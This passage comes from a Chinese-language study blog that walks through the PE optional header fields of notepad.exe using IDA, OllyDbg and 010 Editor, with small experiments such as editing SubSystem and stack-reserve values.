printf:near       ; CODE XREF: _printf↑j</span><br><span class="line">extern:0000402C                                         ; DATA XREF: .got.plt:off_400C↑o</span><br></pre></td></tr></table></figure>
<p><code>.text-&gt;.plt-&gt;.got.plt-&gt;extern</code></p>
<p>类比windows上的32位exe是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先是.text:010069CC                 call    ds:IsTextUnicode</span><br><span class="line"></span><br><span class="line">然后是</span><br><span class="line">.idata:0100100C ; BOOL __stdcall IsTextUnicode(const void *lpv, int iSize, LPINT lpiResult)</span><br><span class="line">.idata:0100100C                 extrn IsTextUnicode:dword</span><br><span class="line">.idata:0100100C                                         ; CODE XREF: sub_10069BA+12↓p</span><br><span class="line">.idata:0100100C                                         ; DATA XREF: sub_10069BA+12↓r</span><br></pre></td></tr></table></figure>
<p><code>.text-&gt;.idata(extern)</code></p>
<p>windows上对动态库函数的调用貌似比linux上少了got,plt表这一步.</p>
</blockquote>
<p>windows上idata具体什么机制呢?这需要学了核心原理后面的IAT才能知道</p>
<h5 id="baseofdata">BaseOfData</h5>
<p>数据段的相对虚拟地址RVA</p>
<p>notepad.exe中该值为8000h,那么实际虚拟内存地址就是<code>1000000h+8000h=1008000h</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711171954659.png"
alt="image-20220711171954659" />
<figcaption aria-hidden="true">image-20220711171954659</figcaption>
</figure>
<p>ida跳转该地址观察</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.data:01008000 ; Section 2. (virtual address 00008000)</span><br><span class="line">.data:01008000 ; Virtual size                  : 00001BA8 (   7080.)</span><br><span class="line">.data:01008000 ; Section size in file          : 00000600 (   1536.)</span><br><span class="line">.data:01008000 ; Offset to raw data for section: 00007200</span><br><span class="line">.data:01008000 ; Flags C0000040: Data Readable Writable</span><br><span class="line">.data:01008000 ; Alignment     : default</span><br><span class="line">.data:01008000 ; ===========================================================================</span><br><span class="line">.data:01008000</span><br><span class="line">.data:01008000 ; Segment type: Pure data</span><br><span class="line">.data:01008000 ; Segment permissions: Read/Write</span><br><span class="line">.data:01008000 _data           segment para public &#x27;DATA&#x27; use32</span><br><span class="line">.data:01008000                 assume cs:_data</span><br><span class="line">.data:01008000                 ;org 1008000h</span><br><span class="line">.data:01008000 ; BYTE Data</span><br><span class="line">.data:01008000 Data            dd 78h                  ; DATA XREF: NPCommand(x,x,x)+4D6↑r</span><br><span class="line">.data:01008000                                         ; NPCommand(x,x,x)+569↑w ...</span><br><span class="line">.data:01008004 dword_1008004   dd 1                    ; DATA XREF: CheckSave(x)+27↑r</span><br><span class="line">.data:01008004                                         ; CheckSave(x)+65↑r ...</span><br><span class="line">.data:01008008 ; WCHAR ClassName</span><br><span class="line">.data:01008008 ClassName:                              ; DATA XREF: sub_1004143+59↑o</span><br><span class="line">.data:01008008                                         ; NPInit(x,x,x,x)+10D↑o</span><br><span class="line">.data:01008008                 text &quot;UTF-16LE&quot;, &#x27;Notepad&#x27;,0</span><br><span class="line">.data:01008018 ; int dword_1008018</span><br><span class="line">.data:01008018 dword_1008018   dd 0FFFFFFFFh           ; DATA XREF: NpSaveDialogHookProc(x,x,x,x)+94↑r</span><br><span class="line">.data:01008018                                         ; NpOpenDialogHookProc(x,x,x,x)+4F↑w ...</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ida一开始给出的一块注释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:01008000 ; Section 2. (virtual address 00008000)</span><br><span class="line">.data:01008000 ; Virtual size                  : 00001BA8 (   7080.)</span><br><span class="line">.data:01008000 ; Section size in file          : 00000600 (   1536.)</span><br><span class="line">.data:01008000 ; Offset to raw data for section: 00007200</span><br><span class="line">.data:01008000 ; Flags C0000040: Data Readable Writable</span><br><span class="line">.data:01008000 ; Alignment     : default</span><br></pre></td></tr></table></figure>
<p>第二节(相对虚拟地址8000h)</p>
<p>虚拟内存中的大小1BA8h字节</p>
<p>磁盘文件中的大小600h字节</p>
<p>磁盘文件中本节的基地址7200h</p>
<p>标志:c0000040,数据段可读写,不可执行</p>
<p>对齐:默认</p>
</blockquote>
<h5 id="imagebase">ImageBase</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711172941299.png"
alt="image-20220711172941299" />
<figcaption aria-hidden="true">image-20220711172941299</figcaption>
</figure>
<p>虚拟地址空间中进程的基地址,也就是PE头将会从0x1000000这个地址开始装载</p>
<p>这一点已经在前面的实验中多次证实了</p>
<blockquote>
<p>微软给出的解释是:</p>
<p>The preferred address of the first byte of the image when it is
loaded in memory. This value is a multiple of 64K bytes. The default
value for DLLs is 0x10000000. The default value for applications is
0x00400000, except on Windows CE where it is 0x00010000.</p>
<p>映像首个字节在装载进内存时最好使用ImageBase这个地址</p>
<p>ImageBase这个值必须是64K(0x10000)的倍数,也就是说,就算装不进0x1000000,下一个有效地址应该是0x1010000,再下一个就得是0x1020000,啃腚不会出现0x1011000这种ImageBase值</p>
<p>DLL动态库该值的默认值是0x10000000</p>
<p>应用程序该值默认为0x400000</p>
<p>应用程序在<code>windows CE</code>系统上该值为默认为0x10000</p>
</blockquote>
<p>显然notepad.exe的ImageBase=0x1000000不是DLL的ImageBase默认值(注意零的个数不一样)</p>
<p>也不是应用程序的,它就非得搞那个特殊</p>
<p>我们自己写一个helloworld然后<code>gcc helloworld.c -O0 -o helloworld -m32</code>编译成一个32为程序,用010editor观察其ImageBase确实是0x400000</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711173959730.png"
alt="image-20220711173959730" />
<figcaption aria-hidden="true">image-20220711173959730</figcaption>
</figure>
<blockquote>
<p>为啥ida最上最上只能观察到0x1001000这个位置?不是应当从0x1000000开始吗?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711174053133.png"
alt="image-20220711174053133" />
<figcaption aria-hidden="true">image-20220711174053133</figcaption>
</figure>
<p>并且就算使用G企图跳转到1000000这个位置,ida也会报告Command "JumpAsk"
failed</p>
<p>这是为啥?前面的东西让ida吃了?</p>
<p>原因是ida反汇编显示的只有PE体,即去掉PE头剩下的各节区(注意不是节区头表)</p>
<p>而ollydbg就可以Ctrl+G跳转到0x1000000这个位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711174407510.png"
alt="image-20220711174407510" />
<figcaption aria-hidden="true">image-20220711174407510</figcaption>
</figure>
<p>上来是PE魔数0x5A 4D</p>
<p>而ollydbg的反汇编窗口把它也当成指令了</p>
<p>这时候应该看16进制视图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711174508519.png"
alt="image-20220711174508519" />
<figcaption aria-hidden="true">image-20220711174508519</figcaption>
</figure>
<p>可以看到最开始的MZ魔数</p>
</blockquote>
<h5 id="sectionalignment">SectionAlignment</h5>
<p>节对齐要求,每个节都必须按照该要求装进虚拟地址空间的合适位置</p>
<p>该值必须大于等于FileAlignment的值,这就解释了为啥进程映像在虚拟内存中的大小要比躺在为你文件中时要大</p>
<p>默认的SectionAlignment大小为一个页框的大小(win32上一个页框<span
class="math inline">\(4K=2^{12}=0x1000h\)</span>)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711185609155.png"
alt="image-20220711185609155" />
<figcaption aria-hidden="true">image-20220711185609155</figcaption>
</figure>
<p>notepad.exe是满足该对齐要求的</p>
<h5 id="filealignment">FileAlignment</h5>
<p>磁盘文件中的节对齐要求,这个值必须是一个2的幂<span
class="math inline">\([2^8,2^{16}]\)</span></p>
<p>默认是512,如果SectionAlignment的值比页框要小,则FileAlignment必须和SectionAlignment相同</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711185848617.png"
alt="image-20220711185848617" />
<figcaption aria-hidden="true">image-20220711185848617</figcaption>
</figure>
<p>notepad.exe上由于SectionAlignment和页框一样大,因此FileAlignment可以小</p>
<p>实际上是默认值512=200h</p>
<h5
id="majorminoroperatingsystemversion">Major/MinorOperatingSystemVersion</h5>
<p>主要/次要操作系统版本号</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193701271.png"
alt="image-20220711193701271" />
<figcaption aria-hidden="true">image-20220711193701271</figcaption>
</figure>
<p>这个版本号可以在CMD命令提示符上使用ver命令查询(在powershell上不能用这个命令)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\86135&gt;ver</span><br><span class="line"></span><br><span class="line">Microsoft Windows [版本 10.0.22621.105]</span><br></pre></td></tr></table></figure>
<p>系统版本号表:</p>
<table>
<thead>
<tr>
<th style="text-align: left;">Operating system</th>
<th style="text-align: left;">Version number</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">Windows 11</td>
<td style="text-align: left;">10.0*</td>
</tr>
<tr>
<td style="text-align: left;">Windows 10</td>
<td style="text-align: left;">10.0*</td>
</tr>
<tr>
<td style="text-align: left;">Windows Server 2022</td>
<td style="text-align: left;">10.0*</td>
</tr>
<tr>
<td style="text-align: left;">Windows Server 2019</td>
<td style="text-align: left;">10.0*</td>
</tr>
<tr>
<td style="text-align: left;">Windows Server 2016</td>
<td style="text-align: left;">10.0*</td>
</tr>
<tr>
<td style="text-align: left;">Windows 8.1</td>
<td style="text-align: left;">6.3*</td>
</tr>
<tr>
<td style="text-align: left;">Windows Server 2012 R2</td>
<td style="text-align: left;">6.3*</td>
</tr>
<tr>
<td style="text-align: left;">Windows 8</td>
<td style="text-align: left;">6.2</td>
</tr>
<tr>
<td style="text-align: left;">Windows Server 2012</td>
<td style="text-align: left;">6.2</td>
</tr>
<tr>
<td style="text-align: left;">Windows 7</td>
<td style="text-align: left;">6.1</td>
</tr>
<tr>
<td style="text-align: left;">Windows Server 2008 R2</td>
<td style="text-align: left;">6.1</td>
</tr>
<tr>
<td style="text-align: left;">Windows Server 2008</td>
<td style="text-align: left;">6.0</td>
</tr>
<tr>
<td style="text-align: left;">Windows Vista</td>
<td style="text-align: left;">6.0</td>
</tr>
<tr>
<td style="text-align: left;">Windows Server 2003 R2</td>
<td style="text-align: left;">5.2</td>
</tr>
<tr>
<td style="text-align: left;">Windows Server 2003</td>
<td style="text-align: left;">5.2</td>
</tr>
<tr>
<td style="text-align: left;">Windows XP 64-Bit Edition</td>
<td style="text-align: left;">5.2</td>
</tr>
<tr>
<td style="text-align: left;">Windows XP</td>
<td style="text-align: left;">5.1</td>
</tr>
<tr>
<td style="text-align: left;">Windows 2000</td>
<td style="text-align: left;">5.0</td>
</tr>
<tr>
<td style="text-align: left;">Windows 98 / Windows Me</td>
<td style="text-align: left;">4.0</td>
</tr>
<tr>
<td style="text-align: left;">Windows 95</td>
<td style="text-align: left;">4.0</td>
</tr>
</tbody>
</table>
<p>也就是说是最早可以运行notepad.exe的windows系统就是win 2000,</p>
<p>只要版本号比5高的系统都可以运行notepad.exe</p>
<h5 id="majorminorimageversion">Major/MinorImageVersion</h5>
<p>主要/次要映像版本</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193728974.png"
alt="image-20220711193728974" />
<figcaption aria-hidden="true">image-20220711193728974</figcaption>
</figure>
<p>也可以在CMD上用<code>dism /online /get-targeteditions</code>命令查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">86135</span>&gt;dism /online /get-targeteditions</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: <span class="number">10.0</span><span class="number">.22621</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">映像版本: <span class="number">10.0</span><span class="number">.22621</span><span class="number">.105</span></span><br></pre></td></tr></table></figure>
<p>这个东西是干啥的,没有搜到</p>
<h5 id="majorminorsubsystemversion">Major/MinorSubsystemVersion</h5>
<p>主要/次要子系统版本</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193741398.png"
alt="image-20220711193741398" />
<figcaption aria-hidden="true">image-20220711193741398</figcaption>
</figure>
<h5 id="win32versionvalue">Win32VersionValue</h5>
<p>预留值,必须为0</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193752606.png"
alt="image-20220711193752606" />
<figcaption aria-hidden="true">image-20220711193752606</figcaption>
</figure>
<h5 id="sizeofimage">SizeOfImage</h5>
<p>映像大小,即本文件完全装载进入虚拟内存中占用的空间</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193823319.png"
alt="image-20220711193823319" />
<figcaption aria-hidden="true">image-20220711193823319</figcaption>
</figure>
<p>该值必须是节对齐要求的整数倍</p>
<h5 id="sizeofheaders">SizeOfHeaders</h5>
<p>包括DOS头,Nt头,节头表三个的总大小,然后向上舍入到一个FileAlignment的倍数值</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193840091.png"
alt="image-20220711193840091" />
<figcaption aria-hidden="true">image-20220711193840091</figcaption>
</figure>
<h5 id="checksum">CheckSum</h5>
<p>检校和</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193848414.png"
alt="image-20220711193848414" />
<figcaption aria-hidden="true">image-20220711193848414</figcaption>
</figure>
<p>从程序最开始,以两个字节为单位不断相加,忽略溢出,最后加上文件长度得到校验和</p>
<p>在加载任何驱动程序,启动时任何动态库,任何系统进程加载动态库时</p>
<p>都需要经过检校</p>
<h5 id="subsystem">SubSystem</h5>
<p>这是一个枚举值,每个值对应一个序号,表示运行本镜像需要的子系统</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_UNKNOWN 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_NATIVE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_GUI 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_CUI 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_OS2_CUI 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_POSIX_CUI 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_NATIVE_WINDOWS 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_CE_GUI 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_APPLICATION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_EFI_ROM 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_XBOX 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION 16</span></span><br></pre></td></tr></table></figure>
<p>比如2号就是windows用户图形界面接口子系统,就是窗口程序</p>
<p>比如3号就是windows字符模式用户接口子系统,就是控制台程序</p>
<p>notepad.exe当然需要GUI界面,因此该值为2</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711193921306.png"
alt="image-20220711193921306" />
<figcaption aria-hidden="true">image-20220711193921306</figcaption>
</figure>
<blockquote>
<p>自己写的控制台程序helloworld.exe,这个值就是CUI</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711194026471.png"
alt="image-20220711194026471" />
<figcaption aria-hidden="true">image-20220711194026471</figcaption>
</figure>
</blockquote>
<p>如果使用010editor将notepad.exe的SubSystem值给他改一下,改成CUI,会发生啥呢?</p>
<p>会同时运行一个控制台和一个窗口程序</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711194252567.png"
alt="image-20220711194252567" />
<figcaption aria-hidden="true">image-20220711194252567</figcaption>
</figure>
<p>在控制台上使用ctrl+C中断进程</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[已退出进程，代码为 3221225786 (0xc000013a)]</span><br></pre></td></tr></table></figure>
<p>窗口也会跟着关闭</p>
<p>同理点选窗口右上角的❌,控制台也会关闭</p>
<p>将SubSystem值再改为其他值都会报错无法在win32环境运行</p>
<h5 id="dllcharacteristics">DllCharacteristics</h5>
<p>枚举值,描述本映像加载动态库的属性</p>
<table>
<colgroup>
<col style="width: 48%" />
<col style="width: 51%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">0x0001</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td style="text-align: left;">0x0002</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td style="text-align: left;">0x0004</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td style="text-align: left;">0x0008</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLL_CHARACTERISTICS_HIGH_ENTROPY_VA</strong>0x0020</td>
<td style="text-align: left;">ASLR with 64 bit address space.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</strong>0x0040</td>
<td style="text-align: left;">The DLL can be relocated at load
time.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY</strong>0x0080</td>
<td style="text-align: left;">Code integrity checks are forced. If you
set this flag and a section contains only uninitialized data, set the
<strong>PointerToRawData</strong> member of <a
target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-image_section_header">IMAGE_SECTION_HEADER</a>
for that section to zero; otherwise, the image will fail to load because
the digital signature cannot be verified.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLLCHARACTERISTICS_NX_COMPAT</strong>0x0100</td>
<td style="text-align: left;">The image is compatible with data
execution prevention (DEP).</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLLCHARACTERISTICS_NO_ISOLATION</strong>0x0200</td>
<td style="text-align: left;">The image is isolation aware, but should
not be isolated.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLLCHARACTERISTICS_NO_SEH</strong>0x0400</td>
<td style="text-align: left;">The image does not use structured
exception handling (SEH). No handlers can be called in this image.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLLCHARACTERISTICS_NO_BIND</strong>0x0800</td>
<td style="text-align: left;">Do not bind the image.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLL_CHARACTERISTICS_APPCONTAINER</strong>0x1000</td>
<td style="text-align: left;">Image should execute in an
AppContainer.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLLCHARACTERISTICS_WDM_DRIVER</strong>0x2000</td>
<td style="text-align: left;">A WDM driver.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLL_CHARACTERISTICS_GUARD_CF</strong>0x4000</td>
<td style="text-align: left;">Image supports Control Flow Guard.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE</strong>0x8000</td>
<td style="text-align: left;">The image is terminal server aware.</td>
</tr>
</tbody>
</table>
<p>比如0x0020表示ASLR,地址随机化</p>
<p>比如0x0040表示动态库可以在装载时重定位</p>
<p>0x0080,强迫进行代码完整性检查,作用是防止恶意代码注入等等安全问题</p>
<p>0x0100,NX保护,数据段不可执行</p>
<p>...</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711195943323.png"
alt="image-20220711195943323" />
<figcaption aria-hidden="true">image-20220711195943323</figcaption>
</figure>
<p>notepad.exe上这个值为0x8000(小端)</p>
<h5 id="sizeofstackreserve">SizeOfStackReserve</h5>
<p>栈区预留空间大小,notepad.exe上栈区的预留了大小是40000h,即256K</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711200402067.png"
alt="image-20220711200402067" />
<figcaption aria-hidden="true">image-20220711200402067</figcaption>
</figure>
<p>该值就是栈区的最大大小,要是本地变量太多或者函数递归太深太多,则发生栈溢出,</p>
<blockquote>
<p>这里可以自己写一个程序实验一下,</p>
<p><code>524288=2^19=2^9K=80000h&lt;800000=2e5</code></p>
<p>那么我们在代码中开一个2e5的int数组,超过了524288字节,看看能否开出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">200000</span>];<span class="comment">//2e5数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">200000</span>;++i)&#123;</span><br><span class="line">        arr[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714232816684.png"
alt="image-20220714232816684" />
<figcaption aria-hidden="true">image-20220714232816684</figcaption>
</figure>
<p>可以看到,本来预留的
栈空间是200000h=2M是可以放下2e5的数组的,全换算成int是0.5M个,即512K</p>
<p>此时程序正常运行</p>
<p>现在给他穿个小鞋</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711202828849.png"
alt="image-20220711202828849" />
<figcaption aria-hidden="true">image-20220711202828849</figcaption>
</figure>
<p>果然寄了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711202847174.png"
alt="image-20220711202847174" />
<figcaption aria-hidden="true">image-20220711202847174</figcaption>
</figure>
<p>而这个返回代码0xc00000fd正是栈溢出的状态</p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/caichengji1/article/details/53885081">Windows
异常代码查询</a></p>
</blockquote>
<h5 id="sizeofstackcommit">SizeOfStackCommit</h5>
<p>栈提交大小,notepad.exe上栈提交大小是11000h即68K</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711200716003.png"
alt="image-20220711200716003" />
<figcaption aria-hidden="true">image-20220711200716003</figcaption>
</figure>
<p>啥是"提交大小"?</p>
<p>中文站点下没找到,在stackoverflow上找到了解答</p>
<p><a
target="_blank" rel="noopener" href="https://stackoverflow.com/questions/24260638/what-is-the-difference-between-reserve-and-commit-argument-to-createthread#:~:text=The%20reserve%20argument%20sets%20the%20amount%20of%20address,be%20initially%20committed%20to%20the%20stack&#39;s%20reserved%20region.">c++
- What is the Difference between reserve and commit argument to
CreateThread? - Stack Overflow</a></p>
<blockquote>
<p>The <em>commit</em> is the size of physical memory that the system
should preallocate for the stack</p>
</blockquote>
<p>commit就是为栈区预留的物理内存大小</p>
<blockquote>
<p>SizeOfStackReserve是栈区最大占用的虚拟内存空间的大小</p>
<p>SizeOfStackCommit是栈区对应虚拟内存实际使用的物理内存大小</p>
</blockquote>
<h5 id="sizeofheapreserve">SizeOfHeapReserve</h5>
<p>堆区预留空间大小,类似于SizeOfStackReserve</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711201710792.png"
alt="image-20220711201710792" />
<figcaption aria-hidden="true">image-20220711201710792</figcaption>
</figure>
<h5 id="sizeofheapcommit">SizeOfHeapCommit</h5>
<p>堆区实际使用物理地址空间大小</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711201719842.png"
alt="image-20220711201719842" />
<figcaption aria-hidden="true">image-20220711201719842</figcaption>
</figure>
<h5 id="loaderflags">LoaderFlags</h5>
<p>已经被官方扬了</p>
<h5 id="numberofrvaandsizes">NumberOfRvaAndSizes</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711204300399.png"
alt="image-20220711204300399" />
<figcaption aria-hidden="true">image-20220711204300399</figcaption>
</figure>
<p>微软也是春秋笔法,这个值的解释就短短一行</p>
<blockquote>
<p>The number of directory entries in the remainder of the optional
header. Each entry describes a location and size.</p>
<p>可选头中剩下的部分中,目录条目的个数.</p>
<p>每个条目描述了一个位置和大小</p>
</blockquote>
<p>你说你🐎呢,这说了个什么事啊?</p>
<p>这需要联系可选头剩余的部分一起看,确实剩下的部分有16个条目</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711204911890.png"
alt="image-20220711204911890" />
<figcaption aria-hidden="true">image-20220711204911890</figcaption>
</figure>
<p>这16个条目顺序是固定的,</p>
<p>如果NumberOfRvaAndSizes=1则只有导出表条目</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711210809700.png"
alt="image-20220711210809700" />
<figcaption aria-hidden="true">image-20220711210809700</figcaption>
</figure>
<p>如果NumberOfRvaAndSizes=2则有导出表和导入表两个条目</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711210848527.png"
alt="image-20220711210848527" />
<figcaption aria-hidden="true">image-20220711210848527</figcaption>
</figure>
<p>...</p>
<p>以此类推</p>
<p>每个条目对应的表是干啥的呢?</p>
<h5
id="datadirectoryimage_numberof_directory_entries">DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]</h5>
<p>其中数组大小<code>#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16</code>这个值恒为16不变,</p>
<p>意思是,虽然<code>DataDirectory</code>一直就是16项,但是实际多少项有效,这需要上一个成员<code>NumberOfRvaAndSizes</code>来决定</p>
<p>现在的问题是,<strong><code>DataDirectory</code>数组的元素是什么呢?</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712111448720.png"
alt="image-20220712111448720" />
<figcaption aria-hidden="true">image-20220712111448720</figcaption>
</figure>
<p>每个数组元素的结构相同</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711205101433.png"
alt="image-20220711205101433" />
<figcaption aria-hidden="true">image-20220711205101433</figcaption>
</figure>
<blockquote>
<p>DataDirectory数组中的每项都对应一个重要的技术,包括导入表,导出表,重定位等等</p>
</blockquote>
<p>每一个都有一个VirtualAddress,指向一个相对虚拟地址,还有一个size成员,表征一个大小</p>
<p>指向的谁,表征的又是谁的大小呢?</p>
<h6 id="datadirectory1import">DataDirectory[1]=Import</h6>
<p>以其中的导入表Import为例,其VIrtualAddress指向相对虚拟地址6D20h,010editor已经帮我们计算出了文件偏移为0x6120</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712111646633.png"
alt="image-20220712111646633" />
<figcaption aria-hidden="true">image-20220712111646633</figcaption>
</figure>
<p>下面用010editor观察00x6120这个位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712112009554.png"
alt="image-20220712112009554" />
<figcaption aria-hidden="true">image-20220712112009554</figcaption>
</figure>
<p><strong>发现这是一个名为ImportDescriptor[]的数组的位置</strong></p>
<p>该位置在节区之后,显然已经出了PE头了</p>
